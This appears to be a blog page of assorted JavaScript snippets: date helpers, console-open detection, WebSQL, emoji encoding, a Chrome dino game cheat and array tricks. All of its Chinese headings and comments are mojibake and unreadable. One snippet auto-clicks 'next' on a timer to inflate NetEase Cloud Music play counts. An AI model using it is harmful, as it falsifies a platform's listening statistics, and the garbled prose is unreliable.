<h3 id="Chrome-ç›‘å¬-console-æ‰“å¼€"><a href="#Chrome-ç›‘å¬-console-æ‰“å¼€" class="headerlink" title="Chrome ç›‘å¬ console æ‰“å¼€"></a>Chrome ç›‘å¬ console æ‰“å¼€</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> re = <span class="regexp">/x/</span>;</span><br><span class="line"><span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">console</span>.log(re);</span><br><span class="line"></span><br><span class="line">re.toString = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'ç¬¬ '</span> + (++i) + <span class="string">' æ¬¡æ‰“å¼€æ§åˆ¶å°'</span>;<span class="comment">//https://www.52cik.com/2016/04/27/chrome-console-open.html</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="æ“ä½œä¹‹ç¥å¥‡çš„-date"><a href="#æ“ä½œä¹‹ç¥å¥‡çš„-date" class="headerlink" title="æ“ä½œä¹‹ç¥å¥‡çš„ date"></a>æ“ä½œä¹‹ç¥å¥‡çš„ date</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è·å–æœˆä»½å¤©æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMonthDayCount</span>(<span class="params">year, month</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Date</span>(year, month, <span class="number">0</span>).getDate();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(getMonthDayCount(<span class="number">2017</span>, <span class="number">10</span>)); <span class="comment">// 31</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAllMonthDayCount</span>(<span class="params">year</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> days = [<span class="number">31</span>, <span class="keyword">new</span> <span class="built_in">Date</span>(year, <span class="number">2</span>, <span class="number">0</span>).getDate(), <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>];</span><br><span class="line">  <span class="keyword">return</span> days;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(getAllMonthDayCount(<span class="number">2016</span>));<span class="comment">// [31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isLeapYear</span>(<span class="params">year</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (year % <span class="number">4</span> == <span class="number">0</span>) &amp;&amp; (year % <span class="number">100</span> != <span class="number">0</span> || year % <span class="number">400</span> == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isLeapYear</span>(<span class="params">year</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Date</span>(year, <span class="number">2</span>, <span class="number">0</span>).getDate() === <span class="number">29</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log([</span><br><span class="line">  isLeapYear(<span class="number">2000</span>),</span><br><span class="line">  isLeapYear(<span class="number">2016</span>),</span><br><span class="line">  isLeapYear(<span class="number">2017</span>),</span><br><span class="line">  isLeapYear(<span class="number">2018</span>)</span><br><span class="line">]); <span class="comment">// [ true, true, false, false ]</span></span><br><span class="line"><span class="comment">// 10å¤©åæ˜¯å‡ æœˆå‡ å·</span></span><br><span class="line"><span class="keyword">var</span> dt = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">'2016-12-25'</span>);</span><br><span class="line">dt.setDate(dt.getDate() + <span class="number">10</span>);</span><br><span class="line"><span class="built_in">console</span>.log(dt.toLocaleDateString()); <span class="comment">// 2017/1/4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 10å¤©å‰æ˜¯å‡ æœˆå‡ å·https://www.52cik.com/2017/10/11/js-date-month.html</span></span><br><span class="line"><span class="keyword">var</span> dt = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">'2017-01-04'</span>);</span><br><span class="line">dt.setDate(dt.getDate() - <span class="number">10</span>);</span><br><span class="line"><span class="built_in">console</span>.log(dt.toLocaleDateString()); <span class="comment">// 2016/12/25</span></span><br></pre></td></tr></table></figure>
<h3 id="æ—¥æœŸæ˜¯å¦æ˜¯è¿ç»­"><a href="#æ—¥æœŸæ˜¯å¦æ˜¯è¿ç»­" class="headerlink" title="æ—¥æœŸæ˜¯å¦æ˜¯è¿ç»­"></a>æ—¥æœŸæ˜¯å¦æ˜¯è¿ç»­</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> days = [</span><br><span class="line">  <span class="string">'2016-02-28'</span>,</span><br><span class="line">  <span class="string">'2016-02-29'</span>, <span class="comment">// é—°æœˆ</span></span><br><span class="line">  <span class="string">'2016-03-01'</span>, <span class="comment">// è·¨æœˆ</span></span><br><span class="line">  <span class="string">'2016-03-02'</span>,</span><br><span class="line">  <span class="string">'2016-03-03'</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment">// å…ˆæ’åºï¼Œç„¶åè½¬æ—¶é—´æˆ³</span></span><br><span class="line"><span class="keyword">let</span> _days = days.sort().map(<span class="function">(<span class="params">d, i</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> dt = <span class="keyword">new</span> <span class="built_in">Date</span>(d)</span><br><span class="line">  dt.setDate(dt.getDate() + <span class="number">4</span> - i) <span class="comment">// å¤„ç†ä¸ºç›¸åŒæ—¥æœŸ</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> +dt</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¯”è¾ƒæ—¶é—´æˆ³æ˜¯å¦ä¸€è‡´</span></span><br><span class="line"><span class="built_in">console</span>.log(</span><br><span class="line">  _days[<span class="number">0</span>] == _days[<span class="number">1</span>] &amp;&amp;</span><br><span class="line">  _days[<span class="number">0</span>] == _days[<span class="number">2</span>] &amp;&amp;</span><br><span class="line">  _days[<span class="number">0</span>] == _days[<span class="number">3</span>] &amp;&amp;</span><br><span class="line">  _days[<span class="number">0</span>] == _days[<span class="number">4</span>]</span><br><span class="line">)</span><br><span class="line"><span class="keyword">let</span> days = [</span><br><span class="line">  <span class="string">'2016-02-28 12:00:00'</span>,</span><br><span class="line">  <span class="string">'2016-02-29 12:00:01'</span>, <span class="comment">// é—°æœˆ</span></span><br><span class="line">  <span class="string">'2016-03-01 12:00:02'</span>, <span class="comment">// è·¨æœˆ</span></span><br><span class="line">  <span class="string">'2016-03-02 12:00:03'</span>,</span><br><span class="line">  <span class="string">'2016-03-03 12:00:04'</span>,</span><br><span class="line">  <span class="string">'2016-03-04 12:00:04'</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(continueDays(days))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">continueDays</span>(<span class="params">arr_days</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// å…ˆæ’åºï¼Œç„¶åè½¬æ—¶é—´æˆ³</span></span><br><span class="line">  <span class="keyword">let</span> days = arr_days.sort().map(<span class="function">(<span class="params">d, i</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> dt = <span class="keyword">new</span> <span class="built_in">Date</span>(d)</span><br><span class="line">    dt.setDate(dt.getDate() + <span class="number">4</span> - i) <span class="comment">// å¤„ç†ä¸ºç›¸åŒæ—¥æœŸ</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŠ¹å» æ—¶ åˆ† ç§’ æ¯«ç§’</span></span><br><span class="line">    dt.setHours(<span class="number">0</span>)</span><br><span class="line">    dt.setMinutes(<span class="number">0</span>)</span><br><span class="line">    dt.setSeconds(<span class="number">0</span>)</span><br><span class="line">    dt.setMilliseconds(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> +dt</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> ret = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  days.forEach(<span class="function"><span class="params">d</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (days[<span class="number">0</span>] !== d) &#123;</span><br><span class="line">      ret = <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret</span><br><span class="line">&#125;https:<span class="comment">//www.52cik.com/2016/07/10/consecutive-dates.html</span></span><br></pre></td></tr></table></figure>
<h3 id="è·¨åŸŸä»£ç†å·¥å…·"><a href="#è·¨åŸŸä»£ç†å·¥å…·" class="headerlink" title="è·¨åŸŸä»£ç†å·¥å…·"></a>è·¨åŸŸä»£ç†å·¥å…·</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bingæ¯æ—¥åˆ†äº«æ¥å£ </span><br><span class="line">http:<span class="comment">//cn.bing.com/HPImageArchive.aspx?format=js&amp;idx=0&amp;n=1</span></span><br><span class="line">        http:<span class="comment">//www.bing.com/HPImageArchive.aspx?format=js&amp;idx=0&amp;n=1&amp;mkt=zh-CN</span></span><br><span class="line">        ç›´æ¥åœ¨æµè§ˆå™¨æ‰“å¼€æ˜¯å¦‚ä¸‹çš„json,è¦æ‹¿åˆ°çš„å°±æ˜¯urlï¼Œç›´æ¥åœ¨ä¸€ä¸ªé¡µé¢ç”¨jsè·å–å­˜åœ¨è·¨åŸŸé—®é¢˜ï¼Œå¯ä»¥ç”¨ä»£ç†å·¥å…· https:<span class="comment">//jsonp.afeld.me/ æˆ‘ç”¨çš„æ˜¯ç¬¬äºŒä¸ªæ–¹æ³•,æŠŠä¸Šé¢çš„apiè¾“å…¥ï¼Œ</span></span><br><span class="line">        </span><br><span class="line">        ç‚¹å‡»goå¾—åˆ°ä¸€ä¸ªç»è¿‡ä»£ç†åçš„apiï¼Œå¦‚ä¸‹</span><br><span class="line">         </span><br><span class="line">        https:<span class="comment">//jsonp.afeld.me/?url=http%3A%2F%2Fcn.bing.com%2FHPImageArchive.aspx%3Fformat%3Djs%26idx%3D0%26n%3D1</span></span><br><span class="line">https:<span class="comment">//codepen.io/fazero/pen/KzooBZ  https://blog.fazero.me/2016/04/14/js-get-bing-photo/</span></span><br></pre></td></tr></table></figure>
<h3 id="ç½‘æ˜“äº‘éŸ³ä¹åˆ·å¬æ­Œé‡"><a href="#ç½‘æ˜“äº‘éŸ³ä¹åˆ·å¬æ­Œé‡" class="headerlink" title="ç½‘æ˜“äº‘éŸ³ä¹åˆ·å¬æ­Œé‡"></a>ç½‘æ˜“äº‘éŸ³ä¹åˆ·å¬æ­Œé‡</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setInterval(<span class="string">'document.getElementsByClassName("nxt")[0].click();console.log("Play OJBK. Next")'</span>,<span class="number">90000</span>);</span><br><span class="line">https:<span class="comment">//www.mmuaa.com/post/cd44019a0e569d64.html</span></span><br></pre></td></tr></table></figure>
<h3 id="emoji"><a href="#emoji" class="headerlink" title="emoji"></a>emoji</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JavaScript å­—ç¬¦ä¸²ç¼–ç ä½¿ç”¨ UTF-16 https://gist.github.com/justjavac/a5aa1c0d0d111cf19e852037f4c483db</span></span><br><span class="line"><span class="string">"ğŸ’©"</span>.length === <span class="number">2</span>;</span><br><span class="line"><span class="string">"ğŸ’©"</span> === <span class="string">"\u&#123;1F4A9&#125;"</span>;    <span class="comment">// es6</span></span><br><span class="line"><span class="string">"ğŸ’©"</span> === <span class="string">"\uD83D\uDCA9"</span>; <span class="comment">// es5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// åŒä¸€ä¸ªç¼–ç å¯èƒ½ä½¿ç”¨ä¸åŒçš„ç ä½</span></span><br><span class="line"><span class="string">"oÌ€"</span> === <span class="string">"Ã²"</span>;       <span class="comment">// â</span></span><br><span class="line"><span class="string">"Ã²"</span> === <span class="string">"\xF2"</span>;    <span class="comment">// âœ…</span></span><br><span class="line"><span class="string">"oÌ€"</span> === <span class="string">"o\u0300"</span>; <span class="comment">// âœ…</span></span><br><span class="line"><span class="string">"o\u0300"</span>.normalize(<span class="string">"NFC"</span>) === <span class="string">"\xF2"</span>; <span class="comment">// âœ… es6 æä¾›äº† normalize å‡½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="string">"ğŸ‘¨â€ğŸ‘©â€ğŸ‘§â€ğŸ‘¦"</span>.length === <span class="number">11</span>;</span><br><span class="line"><span class="string">"ğŸ‘¨â€ğŸ‘©â€ğŸ‘§â€ğŸ‘¦"</span> === <span class="string">"\u&#123;1F468&#125;\u200D\u&#123;1F469&#125;\u200D\u&#123;1F467&#125;\u200D\u&#123;1F466&#125;"</span>;</span><br><span class="line"><span class="string">"ğŸ‘¨"</span> === <span class="string">"\u&#123;1F468&#125;"</span>;</span><br><span class="line"><span class="string">"ğŸ‘©"</span> === <span class="string">"\u&#123;1F469&#125;"</span>;</span><br><span class="line"><span class="string">"ğŸ‘§"</span> === <span class="string">"\u&#123;1F467&#125;"</span>;</span><br><span class="line"><span class="string">"ğŸ‘¦"</span> === <span class="string">"\u&#123;1F466&#125;"</span>;</span><br></pre></td></tr></table></figure>
<h3 id="æœ¬åœ°å­˜å‚¨websql"><a href="#æœ¬åœ°å­˜å‚¨websql" class="headerlink" title="æœ¬åœ°å­˜å‚¨websql"></a>æœ¬åœ°å­˜å‚¨websql</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">openDatabaseï¼šè¿™ä¸ªæ–¹æ³•ä½¿ç”¨ç°æœ‰çš„æ•°æ®åº“æˆ–è€…æ–°å»ºçš„æ•°æ®åº“åˆ›å»ºä¸€ä¸ªæ•°æ®åº“å¯¹è±¡ã€‚</span><br><span class="line">transactionï¼šè¿™ä¸ªæ–¹æ³•è®©æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ä¸€ä¸ªäº‹åŠ¡ï¼Œä»¥åŠåŸºäºè¿™ç§æƒ…å†µæ‰§è¡Œæäº¤æˆ–è€…å›æ»šã€‚</span><br><span class="line">executeSqlï¼šè¿™ä¸ªæ–¹æ³•ç”¨äºæ‰§è¡Œå®é™…çš„ SQL æŸ¥è¯¢ã€‚</span><br><span class="line">é¦–å…ˆè¦æƒ³ä½¿ç”¨ WebSQL é¦–å…ˆå¾—åˆ¤æ–­æµè§ˆå™¨æ˜¯å¦æ”¯æŒ</span><br><span class="line"></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">window</span>.openDatabase)</span><br><span class="line">&#123;</span><br><span class="line">    alert(<span class="string">'æ‚¨çš„æµè§ˆå™¨ä¸æ”¯æŒ WebSQL'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">æ‰“å¼€æ•°æ®åº“</span></span><br><span class="line"><span class="regexp">var db = window.openDatabase(dbname, version, dbdesc, dbsize,function() &#123;&#125;);</span></span><br><span class="line"><span class="regexp">openDatabase æ–¹æ³•ä¸­ä¸€å…±åŒ…æ‹¬äº† 5 ä¸ªå‚æ•°,åˆ†åˆ«ä¸ºæ•°æ®åº“åã€ç‰ˆæœ¬å·ã€æè¿°ã€æ•°æ®åº“å¤§å°ã€åˆ›å»ºå›è°ƒã€‚å…¶ä¸­åˆ›å»ºå›è°ƒå¯ä»¥çœç•¥</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">ä¾‹å¦‚åˆ›å»º ç‹è€…è£è€€æ•°æ®åº“</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">var db = openDatabase('wucai', '1.0', 'ç‹è€…è£è€€æ•°æ®åº“', 1024 * 1024);</span></span><br><span class="line"><span class="regexp">äº‹åŠ¡æ“ä½œ</span></span><br><span class="line"><span class="regexp">ä½¿ç”¨ transaction å¯¹äº‹åŠ¡è¿›è¡Œå¤„ç†ã€æ‰§è¡Œæäº¤ã€å›æ»šæ“ä½œ</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">transaction(callback, errorCallback, successCallback); </span></span><br><span class="line"><span class="regexp">åˆ›å»ºæ•°æ®è¡¨</span></span><br><span class="line"><span class="regexp">db.transaction(function (tx) &#123;</span></span><br><span class="line"><span class="regexp">     tx.executeSql('CREATE TABLE IF NOT EXISTS heros (id unique, name, hp_max, mp_max, role_main)');</span></span><br><span class="line"><span class="regexp">&#125;);</span></span><br><span class="line"><span class="regexp">æ’å…¥æ•°æ®</span></span><br><span class="line"><span class="regexp">db.transaction(function (tx) &#123;</span></span><br><span class="line"><span class="regexp">    tx.executeSql('INSERT INTO heros (id, name, hp_max, mp_max, role_main) VALUES (10000, "å¤ä¾¯æƒ‡", 7350, 1746, " å¦å…‹ ")');</span></span><br><span class="line"><span class="regexp">    tx.executeSql('INSERT INTO heros (id, name, hp_max, mp_max, role_main) VALUES (10001, "é’Ÿæ— è‰³", 7000, 1760, " æˆ˜å£« ")');</span></span><br><span class="line"><span class="regexp">    tx.executeSql('INSERT INTO heros (id, name, hp_max, mp_max, role_main) VALUES (10002, "å¼ é£", 8341, 100, " å¦å…‹ ")');</span></span><br><span class="line"><span class="regexp">    tx.executeSql('INSERT INTO heros (id, name, hp_max, mp_max, role_main) VALUES (10003, "ç‰›é­”", 8476, 1926, " å¦å…‹ ")');</span></span><br><span class="line"><span class="regexp">    tx.executeSql('INSERT INTO heros (id, name, hp_max, mp_max, role_main) VALUES (10004, "å•å¸ƒ", 7344, 0, " æˆ˜å£« ")');</span></span><br><span class="line"><span class="regexp">&#125;);</span></span><br><span class="line"><span class="regexp">æŸ¥æ‰¾æ•°æ®</span></span><br><span class="line"><span class="regexp">db.transaction(function (tx) &#123;</span></span><br><span class="line"><span class="regexp">    tx.executeSql('SELECT * FROM heros', [], function (tx, data) &#123;</span></span><br><span class="line"><span class="regexp">    var len = data.rows.length;</span></span><br><span class="line"><span class="regexp">    console.log('æŸ¥æ‰¾åˆ°ï¼š' +len +'æ¡è®°å½•');</span></span><br><span class="line"><span class="regexp">    console.log(data.rows);</span></span><br><span class="line"><span class="regexp">    &#125;);</span></span><br><span class="line"><span class="regexp">&#125;);</span></span><br><span class="line"><span class="regexp">https:/</span><span class="regexp">/laravelcode.cn/</span>posts/<span class="number">99</span>/simple-use-<span class="keyword">of</span>-websql</span><br></pre></td></tr></table></figure>
<h3 id="ç©åChromeå°æé¾™æ¸¸æˆ"><a href="#ç©åChromeå°æé¾™æ¸¸æˆ" class="headerlink" title="ç©åChromeå°æé¾™æ¸¸æˆ"></a>ç©åChromeå°æé¾™æ¸¸æˆ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chrome:<span class="comment">//dino/</span></span><br><span class="line">F12æ‰§è¡Œä»¥ä¸‹ä»£ç ï¼š</span><br><span class="line"><span class="keyword">var</span> dino=Runner.prototype</span><br><span class="line">dino.gameOver=<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;</span><br><span class="line">Runner.instance_.setSpeed(<span class="number">233</span>)</span><br></pre></td></tr></table></figure>
<h3 id="æœ—è¯»æ–‡å­—"><a href="#æœ—è¯»æ–‡å­—" class="headerlink" title="æœ—è¯»æ–‡å­—"></a>æœ—è¯»æ–‡å­—</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ssu=&#123;<span class="attr">init</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ssu.speech(<span class="built_in">window</span>.getSelection().toString())&#125;,<span class="attr">speech</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;e&amp;&amp;<span class="string">""</span>!=e.trim()||(e=<span class="string">"æœªé€‰æ‹©æ–‡å­—"</span>);<span class="keyword">var</span> s=<span class="keyword">new</span> <span class="built_in">window</span>.SpeechSynthesisUtterance(e);<span class="built_in">window</span>.speechSynthesis.speak(s)&#125;&#125;;ssu.init();</span><br></pre></td></tr></table></figure>
<p>###<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœæˆ‘ä»¬æƒ³è¦è°ƒæ•´æ•°ç»„çš„å¤§å°ï¼š</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> entries = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>];  </span><br><span class="line"><span class="built_in">console</span>.log(entries.length); </span><br><span class="line"><span class="comment">// 7  </span></span><br><span class="line">entries.length = <span class="number">4</span>;  </span><br><span class="line"><span class="built_in">console</span>.log(entries.length); </span><br><span class="line"><span class="comment">// 4  </span></span><br><span class="line"><span class="built_in">console</span>.log(entries); </span><br><span class="line"><span class="comment">// [1, 2, 3, 4]</span></span><br><span class="line">å¦‚æœæˆ‘ä»¬æƒ³è¦ç©ºæ•°ç»„ï¼š</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> entries = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]; </span><br><span class="line"><span class="built_in">console</span>.log(entries.length); </span><br><span class="line"><span class="comment">// 7  </span></span><br><span class="line">entries.length = <span class="number">0</span>;   </span><br><span class="line"><span class="keyword">const</span> dynamic = <span class="string">'flavour'</span>;</span><br><span class="line"><span class="keyword">var</span> item = &#123;</span><br><span class="line">    name: <span class="string">'Coke'</span>,</span><br><span class="line">    [dynamic]: <span class="string">'Cherry'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(item); </span><br><span class="line"><span class="comment">// &#123; name: "Coke", flavour: "Cherry" &#125;</span></span><br><span class="line"><span class="keyword">var</span> entries = [<span class="number">1</span>, [<span class="number">2</span>, <span class="number">5</span>], [<span class="number">6</span>, <span class="number">7</span>], <span class="number">9</span>];</span><br><span class="line"><span class="keyword">var</span> flat_entries = [].concat(...entries); </span><br><span class="line"><span class="comment">// [1, 2, 5, 6, 7, 9]</span></span><br><span class="line"><span class="keyword">var</span> my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>];</span><br><span class="line"><span class="built_in">console</span>.log(my_list.sort(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.random() - <span class="number">0.5</span></span><br><span class="line">&#125;)); </span><br><span class="line"><span class="comment">// [4, 8, 2, 9, 1, 3, 6, 5, 7]</span></span><br><span class="line"><span class="keyword">var</span> converted_number = <span class="number">5</span> + <span class="string">""</span>;</span><br><span class="line"><span class="built_in">console</span>.log(converted_number);</span><br><span class="line"><span class="keyword">var</span> entries = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"><span class="keyword">var</span> unique_entries = [...new <span class="built_in">Set</span>(entries)];</span><br><span class="line"><span class="built_in">console</span>.log(unique_entries);</span><br><span class="line"><span class="comment">// [1, 2, 3, 4, 5, 6, 7, 8]</span></span><br><span class="line">https:<span class="comment">//learnku.com/f2e/t/38128</span></span><br></pre></td></tr></table></figure></p>
